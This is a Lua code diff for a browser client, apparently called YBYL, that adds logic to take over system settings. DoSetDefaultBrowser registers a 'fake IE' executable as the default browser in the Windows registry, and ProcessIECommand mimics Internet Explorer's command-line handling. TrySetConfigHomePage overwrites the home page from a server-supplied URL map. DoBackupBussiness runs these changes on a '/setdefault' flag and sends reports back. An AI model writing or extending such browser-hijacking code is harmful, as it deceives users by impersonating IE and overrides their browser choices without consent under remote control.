@@ -248,17 +248,44 @@ function TryExecuteExtraCode(tServerConfig)
 end
 
 
+--改userconfig中的首页字段
+function TrySetConfigHomePage(tServerConfig)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	FunctionObj.TipLog("[TrySetConfigHomePage] begin ")
+	
+	if type(tServerConfig) ~= "table" or type(tServerConfig["tURLMap"]) ~= "table" then
+		FunctionObj.TipLog("[TrySetConfigHomePage] tURLMap not a table ")
+		return false
+	end
+	
+	local tURLMap = tServerConfig["tURLMap"]
+	local strInstallSrc = FunctionObj.GetInstallSrc()
+	
+	for strSource, strURL in pairs(tURLMap) do
+		if string.lower(strSource) == string.lower(strInstallSrc) 
+			and IsRealString(strURL) then
+			FunctionObj.SetHomePage(strURL)
+			FunctionObj.TipLog("[TrySetConfigHomePage] seturl: "..tostring(strURL))
+			return true
+		end
+	end
+	
+	return false
+end
+
+
 function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
 	
 	local tDefaultBrowser = tServerConfig["tDefaultBrowser"]
-	if type(tDefaultBrowser) ~= "table" then
+	if type(tDefaultBrowser) ~= "table" or type(tUserConfig) ~= "table" then
+		FunctionObj.TipLog("[TrySetDefaultBrowser] get table info failed")
 		return false
 	end
 	
 	if not bIgnoreSpanTime then
-		local nSpanTimeInSec = tDefaultBrowser["nSpanTimeInSec"] or 0
+		local nSpanTimeInSec = tDefaultBrowser["nSpanTimeInSec"] or 24*3600
 		local nLastSetDefaultUTC = tUserConfig["nLastSetDefaultUTC"] or 0
 		local bPassCheck = CheckSpanTime(nLastSetDefaultUTC, nSpanTimeInSec)
 		if not bPassCheck then
@@ -281,7 +308,11 @@ function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 		return false
 	end
 	
-	DoSetDefaultBrowser()
+	local bSuccess = DoSetDefaultBrowser()
+	if not bSuccess then
+		FunctionObj.TipLog("[TrySetDefaultBrowser] DoSetDefaultBrowser failed")
+		return false
+	end	
 		
 	tUserConfig["nLastSetDefaultUTC"] = tipUtil:GetCurrentUTCTime()
 	FunctionObj.SaveConfigToFileByKey("tUserConfig")
@@ -366,7 +397,7 @@ function DoSetDefaultBrowser()
 
 	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRHttp", strOldDefBrowPath)
 	
-	local strCommand = "\""..strFakeIEPath.."\" /openlink \"%1\""
+	local strCommand = "\""..strFakeIEPath.."\"  \"%1\""
 	FunctionObj.RegSetValue(strDefBrowRegPath, strCommand)
 	
 	------
@@ -538,14 +569,44 @@ end
 
 function ProcessCommandLine()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	local bRet, strURL = FunctionObj.GetCommandStrValue("/openlink")
-	if bRet and IsRealString(strURL) then
-		FunctionObj.OpenURLInNewTab(strURL)
+	ProcessLocalCommand()      --解析自身的命令行
+	
+	local bHasOpenLink = ProcessIECommand()    --解析ie的命令行
+	if bHasOpenLink then
 		return
 	end
 	
 	TryOpenURLWhenStup()
 end
+
+
+function ProcessLocalCommand()
+end
+
+
+--模拟解析ie命令行
+function ProcessIECommand()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local bHasOpenLink = true
+	local cmdString = tipUtil:GetCommandLine()
+	local cmdList = tipUtil:CommandLineToList(cmdString)
+	
+	local bRet, strURL = FunctionObj.GetCommandStrValue4IE("-new")
+	if bRet and FunctionObj.SimpleCheckIsURL(strURL) then
+		FunctionObj.OpenURLInNewTab(strURL)
+		return bHasOpenLink
+	end
+	
+	local strURL = cmdList[1]
+	if IsRealString(cmdString) and FunctionObj.SimpleCheckIsURL(strURL) then
+		FunctionObj.OpenURLInNewTab(strURL)
+		return bHasOpenLink
+	end
+	
+	return not bHasOpenLink
+end
+
+
 
 
 function TryOpenURLWhenStup()
@@ -577,12 +638,32 @@ end
 
 function DoBackupBussiness()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
-	local cmdString = tipUtil:GetCommandLine()
-	if not string.find(string.lower(cmdString), "/setdefault") then
+	FunctionObj.TipLog("[DoBackupBussiness] enter")
+	
+	local bIgnoreSpanTime = false
+	local bSetHomePage = false
+	local bRet, strSource = FunctionObj.GetCommandStrValue("/setdefault")
+	if not bRet then
+		FunctionObj.TipLog("[DoBackupBussiness] check /setdefault false")
 		return false
 	end
 	
-	FunctionObj.DownLoadServerConfig(function (nDownServer, strServerPath)
+	FunctionObj.TipLog("[DoBackupBussiness] strSource:"..tostring(strSource))
+	
+	local fnDownLoadCofig = FunctionObj.DownLoadServerConfig
+	if IsRealString(strSource) 
+		and (string.lower(strSource) == "ybylpacket" or string.lower(strSource) == "iepacket") then
+		fnDownLoadCofig = FunctionObj.DownLoadInstallConfig
+		-- bIgnoreSpanTime = true
+		bSetHomePage = true
+	end
+	
+	if type(fnDownLoadCofig) ~= "function" then
+		FunctionObj.TipLog("[DoBackupBussiness] fnDownLoadCofig not a function")
+		return false
+	end
+	
+	fnDownLoadCofig(function (nDownServer, strServerPath)
 		if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
 			FunctionObj.TipLog("[DoBackupBussiness] Download server config failed , quit ")
 			tipUtil:Exit("Exit")
@@ -590,11 +671,13 @@ function DoBackupBussiness()
 		end
 	
 		local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
+		if bSetHomePage then
+			TrySetConfigHomePage(tServerConfig)
+		end
 		
-		local bIgnoreSpanTime = true
 		local bSetSuccess = TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 		if bSetSuccess then
-			SendSetDefBrowReport(true)
+			SendSetDefBrowReport(true, strSource)
 		else
 			tipUtil:Exit("Exit")
 		end
@@ -613,6 +696,9 @@ function PreTipMain()
 		tipUtil:Exit("Exit")
 	end
 	
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
+	FunctionObj.ReadAllConfigInfo()
+	
 	local bDoBackup = DoBackupBussiness()
 	if bDoBackup then
 		return
@@ -621,8 +707,6 @@ function PreTipMain()
 	StartRunCountTimer()
 
 	LoadIEHelper()	
-	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
-	FunctionObj.ReadAllConfigInfo()
 	
 	SendStartupReport(false)
 	SendUserInfoReport()
